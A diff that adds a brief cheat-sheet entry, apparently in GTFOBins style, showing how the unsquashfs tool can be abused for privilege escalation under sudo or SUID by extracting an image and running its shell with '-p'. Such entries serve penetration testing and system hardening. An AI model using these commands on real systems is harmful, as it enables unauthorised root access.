@@ -1,0 +1,13 @@
+unsquashfs
+==========
+
+Privilege Escalation
+--------------------
+
+[Sudo]
+    unsquashfs shell
+./squashfs-root/sh -p
+
+[SUID]
+    unsquashfs shell
+./squashfs-root/sh -p
